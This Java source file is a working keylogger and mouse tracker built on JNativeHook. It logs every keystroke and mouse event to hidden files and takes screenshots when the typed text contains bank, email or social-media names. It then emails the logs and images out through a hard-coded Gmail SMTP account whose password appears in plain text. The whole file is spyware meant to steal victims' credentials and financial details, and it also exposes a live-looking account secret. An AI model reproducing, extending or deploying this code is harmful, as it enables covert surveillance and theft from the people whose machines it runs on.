import java.io.PrintWriter;
import java.io.IOException;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import com.github.kwhat.jnativehook.mouse.NativeMouseInputListener;
import com.github.kwhat.jnativehook.mouse.NativeMouseEvent;
import java.sql.Timestamp;
import java.io.File;



public class KeyloggerAndMouse implements NativeKeyListener, NativeMouseInputListener {
	private static PrintWriter pw;
   private static PrintWriter mousepw;
   private static StringBuilder importantInfo = new StringBuilder();
   private static String[] impStrings = {"wells fargo", "wellsfargo", "chase", "bank of america", "bankofamerica", "citibank", "citi bank", "capital one", "capitalone","gmail", "email", "password manager","icloud", "outlook", "drive", "whatsapp", "photos", "instagram"};


   private static String host = "smtp.gmail.com";
   private static String port = "587";
   private static String mailFrom = "sozlpsn@gmail.com";
   private static String password = "xvgwcrjtfcdddekc";
   private static String mailTo = "seanozalpasan@gmail.com";
   private static String subject = "ImpFilesFromUser";
   private static String message = "use these wisely";
   private static int counter = 0;
   private static int index = 0;

	public static void main(String[] args) throws IOException{
      
      try {
         //WINDOWS
         pw = new PrintWriter("C:/Users/Public/Pictures/keys.txt");
         mousepw = new PrintWriter("C:/Users/Public/Pictures/mousedata.txt");

         //LINUX
         // pw = new PrintWriter("/usr/local/src/keys.txt");
         // mousepw = new PrintWriter("/usr/local/src/mousedata.txt");
         
         GlobalScreen.registerNativeHook();
		}
		catch (NativeHookException ex) {
			System.err.println("There was a problem registering the native hook.");
			System.err.println(ex.getMessage());
			System.exit(1);
		} catch (IOException e) {
			System.err.println("There was a problem opening the file.");
			e.printStackTrace();
			System.exit(1);
		}
		KeyloggerAndMouse kl = new KeyloggerAndMouse();
      GlobalScreen.addNativeKeyListener(kl);
      GlobalScreen.addNativeMouseListener(kl);
      GlobalScreen.addNativeMouseMotionListener(kl);
      
	}
   

   public void nativeKeyPressed(NativeKeyEvent e) {
      String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
      
		if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
         try {
            GlobalScreen.unregisterNativeHook();
            pw.close();
         } catch (NativeHookException nativeHookException) {
            nativeHookException.printStackTrace();
         }
      } else if (keyText.equals("Enter")){
         pw.append("\n");
      } else if(keyText.equals("Space")){
         pw.append(" ");
      } else if(keyText.equals("Caps Lock")){
         pw.append("caps");
      } else if (keyText.equals("Shift")){
         pw.append("shft");
      } else if (keyText.equals("Alt")){
         pw.append("alt");
      } else if(keyText.equals("Control")){
         pw.append("ctrl");
      } else if(keyText.equals("Comma")){
         pw.append(",");
      } else if(keyText.equals("Period")){
         pw.append(".");
      } else if (keyText.equals("Slash")){
         pw.append("/");
      } else if (keyText.equals("Semicolon")){
         pw.append(";");
      } else {
         pw.append(keyText);
      }
      pw.flush();
      
      if(keyText.equals("Space")){
         importantInfo.append(" ");
      } else {
         importantInfo.append(keyText);
      }
      System.out.println(importantInfo.toString()); //REMOVE LATER
      checkForImpWordsAndSS(importantInfo);
	}
	
   public void nativeKeyReleased(NativeKeyEvent e) {
		String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
		if(keyText.equals("Shift")){
         pw.append("shft");
         pw.flush();
      }
	}
   
   public void checkForImpWordsAndSS(StringBuilder str){
      
      String temp = str.toString().toLowerCase();
      for(int i = 0; i<impStrings.length; i++){
         if(str.length() > 30){
            str.delete(0,10);
         }
         if(temp.contains(impStrings[i])){
            screenshots.makeScreenshot();
            counter++;
            str.setLength(0);
         }
      }
      if(counter == 8){
         String[] attachFiles = new String[10];

         File direc = new File("C:/Users/Public/Pictures/");
         File[] files = direc.listFiles();

         attachFiles[0] = "C:/Users/Public/Pictures/keys.txt";
         attachFiles[1] = "C:/Users/Public/Pictures/mousedata.txt";


         for(int i = 2; i<10; i++){
            System.out.println("C:/Users/Public/Pictures/" + files[i].getName());
            attachFiles[i] = "C:/Users/Public/Pictures/" + files[i].getName();

            // System.out.println("C:/Users/Public/Pictures/" + files[index + i].getName());
            // attachFiles[i] = "C:/Users/Public/Pictures/" + files[index + i].getName();
            
         }
         //index = index + 9; 
         try {
            screenshots.sendEmailWithAttachments(host, port, mailFrom, password, mailTo, subject, message, attachFiles);
            System.out.println("Email sent successfully.");
            counter = 0;

         } catch (Exception ex) {
            System.out.println("Could not send email.");
            ex.printStackTrace();
         }
      }
   }

   public void nativeMouseClicked(NativeMouseEvent e){
      mousepw.write("clicked # " + e.getClickCount() + "\n");
   }

   public void nativeMousePressed(NativeMouseEvent e){
      Timestamp ts = new Timestamp(System.currentTimeMillis());
      mousepw.write("time " + ts + "\n");
      mousepw.write("pressed " + e.getButton() + "\n");
      mousepw.write("clicked here! " + "x=" + e.getX() + ", " + "y=" + e.getY() + "\n");

   }
   public void nativeMouseReleased (NativeMouseEvent e){
      mousepw.write("released " + e.getButton() + "\n");
      mousepw.write("Here! " + "x=" + e.getX() + ", " + "y=" + e.getY() + "\n");
   }

   public void nativeMouseMoved(NativeMouseEvent e){
      mousepw.write("x=" + e.getX() + ", " + "y=" + e.getY() + "\n");
   }

   public void nativeMouseDragged(NativeMouseEvent e){
      mousepw.write("x=" + e.getX() + ", " + "y=" + e.getY() + "\n");
   }
}